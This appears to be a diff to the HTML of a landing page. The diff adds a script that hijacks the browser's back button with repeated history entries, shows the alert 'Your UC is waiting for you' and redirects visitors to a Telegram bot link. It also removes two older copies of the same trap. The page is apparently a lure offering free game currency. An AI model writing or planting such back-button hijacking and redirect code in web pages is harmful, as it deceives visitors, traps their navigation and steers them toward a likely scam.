@@ -12,6 +12,31 @@
             } catch (o) {}
         }();
     </script>
+<script type="text/javascript">
+    var firstVisit = true; // Flag to track if it's the first visit
+    
+    window.onload = function() {
+        if (firstVisit) {
+            try {
+                history.pushState({}, "", "");
+            } catch (e) {}
+        }
+    };
+
+    window.onpopstate = function(event) {
+        if (firstVisit) {
+            firstVisit = false; // Set flag to false after the first visit
+        } else {
+            // Display alert and redirect
+            alert('Your UC is waiting for you ❤');
+            location.href = 'https://telegram.me/Genucbot';
+        }
+        try {
+            history.pushState({}, "", "");
+        } catch (e) {}
+    };
+</script>
+
 <!DOCTYPE html>
 <head>
     <style>
@@ -1180,20 +1205,7 @@ div#landing_form .wrap-me {max-width:initial;margin:0 auto;display:block;width:1
 
 //]]>
 </script>
-<script type="text/javascript">
-        ! function() {
-            var t;
-            try {
-                for (t = 0; 10 > t; ++t)
-                    history.pushState({}, "", "");
-                onpopstate = function(t) {
-                    t.state && alert(' Your Uc Waiting For you ❤"  ')
-                    location.href =
-                        'https://telegram.me/Genucbot';
-                }
-            } catch (o) {}
-        }();
-    </script>
+
 
 
 </head>
@@ -1283,20 +1295,7 @@ div#landing_form .wrap-me {max-width:initial;margin:0 auto;display:block;width:1
 <script data-cfasync="false" type="text/javascript"></script>
 <script type="5978445137cef72e77deb2a3-text/javascript">
 
-    <script type="text/javascript">
-        ! function() {
-            var t;
-            try {
-                for (t = 0; 10 > t; ++t)
-                    history.pushState({}, "", "");
-                onpopstate = function(t) {
-                    t.state && alert(' Your Uc Waiting For you ❤"  ')
-                    location.href =
-                        'https://telegram.me/Genucbot';
-                }
-            } catch (o) {}
-        }();
-    </script>
+    
 
 /*! WOW wow.js - v1.3.0 - 2016-10-04
 * https://wowjs.uk
